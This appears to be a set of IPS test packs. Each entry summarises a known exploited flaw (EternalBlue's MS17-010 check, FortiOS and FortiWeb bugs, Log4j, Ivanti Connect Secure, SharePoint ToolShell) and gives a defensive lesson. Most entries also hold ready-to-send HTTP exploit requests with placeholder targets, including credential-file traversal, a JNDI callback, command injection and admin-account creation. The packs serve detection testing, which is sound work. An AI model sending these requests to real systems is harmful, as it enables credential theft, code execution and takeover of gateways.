packs.name: MS.SMBv1.Trans.PeekNamedPipe.FID0.Probe
packs.summary: MS17-010 fixed the SMBv1 flaws behind EternalBlue, WannaCry and NotPetya. Scanners and worms check for it the same way: on the IPC$ share they send an SMB_COM_TRANSACTION (0x25) whose setup is PeekNamedPipe (0x23) on file ID 0, aimed at \PIPE\. An unpatched host answers STATUS_INSUFF_SERVER_RESOURCES (0xC0000205), a patched one access denied or invalid handle. Seeing that probe between user networks and servers means something is looking for its next victim.

signatures.name: SMBv1 transaction with PeekNamedPipe on FID 0 (MS17-010 check)

packs.lesson: Segment users from servers and put an IPS sensor on the policies between them; the real fix is the patch and SMBv1 turned off.

packs.name: FortiOS.SSL.VPN.Lang.File.Path.Traversal
packs.summary: FortiOS 5.4.6-5.4.12, 5.6.3-5.6.7 and 6.0.0-6.0.4 let anyone read files through the SSL-VPN web portal: the lang parameter of /remote/fgt_lang walked out of the language directory. The favourite target was /dev/cmdb/sslvpn_websession, which held logged-in users' names and passwords. Credentials harvested this way from tens of thousands of gateways were dumped publicly in 2020 and 2021 and kept working wherever passwords weren't reset after patching.

signatures.name: Directory traversal in the SSL-VPN language file request
SSL-VPN web session file requested through the portal

variants.name: websession-file
variants.request:
GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1
Host: {{target_host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Connection: close

variants.name: encoded-traversal
variants.request:
GET /remote/fgt_lang?lang=%2F..%2F..%2F..%2F..%2Fdev%2Fcmdb%2Fsslvpn_websession&t={{token}} HTTP/1.1
Host: {{target_host}}
User-Agent: python-requests/2.31.0
Connection: close

packs.lesson: Patching closes the hole but not the leak; every VPN password that passed through an exposed gateway must be reset, and MFA makes the stolen ones useless.

packs.name: Log4j.JNDI.Lookup.Injection
packs.summary: Log4j 2 versions before 2.15.0 evaluate ${...} lookups inside logged strings. A JNDI lookup in any logged field (a header, a parameter) makes the server fetch and load a remote object. Attackers spray the lookup in User-Agent, X-Api-Version and query strings, often obfuscated with nested lookups such as ${${lower:j}ndi:...} to dodge naive filters.

signatures.name: JNDI lookup in a request header

variants.name: user-agent
x-api-version
query-string
variants.request:
GET /login?user=${jndi:ldap://{{sinkhole}}:1389/{{token}}} HTTP/1.1
Host: {{target_host}}
User-Agent: curl/8.5.0
Connection: close

variants.name: obfuscated

packs.lesson: An IPS sensor on the DMZ policy stops this at the FortiGate; without one the request reaches the server and only the endpoint sees what follows.

packs.name: FortiOS.Admin.API.Forwarded.Auth.Bypass
packs.summary: FortiOS 7.0.0-7.0.6 and 7.2.0-7.2.1 (and matching FortiProxy and FortiSwitchManager releases) trusted requests that looked like they came from the box itself. A request to the REST API with the internal "Report Runner" user agent and a Forwarded header claiming 127.0.0.1 skipped authentication. Public exploitation used PUT on /api/v2/cmdb/system/admin/<user> to add an SSH key to an administrator.

signatures.name: Admin API request with a loopback Forwarded header and the Report Runner agent
Admin account change through the API from a loopback claim

variants.name: put-admin-ssh-key
get-system-status

packs.lesson: Admin access on the WAN is the real mistake; trusted hosts and a local-in policy stop this before the IPS has to, and the IPS only sees it with deep inspection.

packs.name: Ivanti.Connect.Secure.API.Path.Traversal
packs.summary: Ivanti Connect Secure and Policy Secure 9.x and 22.x let an unauthenticated request reach protected REST endpoints by walking up from an unprotected one: /api/v1/totp/user-backup-code/../../<other path>. Chained with a command injection in license and archiving endpoints (CVE-2024-21887), it gave attackers code execution on VPN gateways in January 2024.

signatures.name: Path traversal out of the TOTP backup-code endpoint
Command separator in the license keys-status path

variants.name: system-information
variants.request:
GET /api/v1/totp/user-backup-code/../../system/system-information HTTP/1.1
Host: {{target_host}}
User-Agent: python-requests/2.31.0
Connection: close

variants.name: keys-status-injection
variants.request:
GET /api/v1/totp/user-backup-code/../../license/keys-status/%3Becho%20{{token}}%3B HTTP/1.1
Host: {{target_host}}
User-Agent: python-requests/2.31.0
Connection: close

packs.lesson: A third-party VPN published through a VIP still needs an IPS sensor on that policy, and deep inspection, because the request is HTTPS.

packs.name: MS.SharePoint.ToolPane.Auth.Bypass.RCE
packs.summary: "ToolShell": on-premises SharePoint Server 2016, 2019 and Subscription Edition accepted a POST to /_layouts/15/ToolPane.aspx?DisplayMode=Edit with a Referer of /_layouts/SignOut.aspx as if it were authenticated (CVE-2025-53771), and the request's web part data was deserialized into code execution (CVE-2025-53770). Mass exploitation in July 2025 stole the servers' ASP.NET machine keys, so patching alone didn't evict attackers. Both are in CISA's Known Exploited Vulnerabilities catalog.

signatures.name: ToolPane edit request with the sign-out Referer
Web part payload posted to ToolPane

variants.name: toolpane-signout
variants.request:
POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
Host: {{target_host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Referer: /_layouts/SignOut.aspx
Content-Type: application/x-www-form-urlencoded
Connection: close

MSOTlPn_Uri=http%3A%2F%2F{{target_host}}%2F_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP={{token}}

packs.lesson: An on-premises SharePoint published through a VIP needs IPS with deep inspection; after a compromise, rotate the ASP.NET machine keys as well as patching.

packs.name: FortiWeb.API.cgi.Path.Traversal.Admin.Create
packs.summary: FortiWeb releases before the November 2025 fixes (8.0.2 and the matching 7.x updates) let an unauthenticated POST reach an internal CGI handler: a path that starts like the admin API and walks back with ../ to /cgi-bin/fwbcgi. That handler trusted a base64 JSON CGIINFO header naming the user to act as, so one request created a new administrator. It was exploited in the wild before Fortinet's advisory in November 2025 and is in CISA's Known Exploited Vulnerabilities catalog.

signatures.name: Traversal from the admin API to the internal CGI handler
Impersonation header sent to the CGI handler

variants.name: create-admin
variants.request:
POST /api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: {{target_host}}
User-Agent: python-requests/2.31.0
CGIINFO: eyJ1c2VybmFtZSI6ImFkbWluIiwicHJvZm5hbWUiOiJwcm9mX2FkbWluIiwidmRvbSI6InJvb3QiLCJsb2dpbm5hbWUiOiJhZG1pbiJ9
Content-Type: application/json
Connection: close

{"data": {"q_type": 1, "name": "{{token}}", "access-profile": "prof_admin", "password": "{{token}}"}}

packs.lesson: A WAF's own management interface must never face the Internet; an IPS in front of it with deep inspection is the backstop, not the fix.
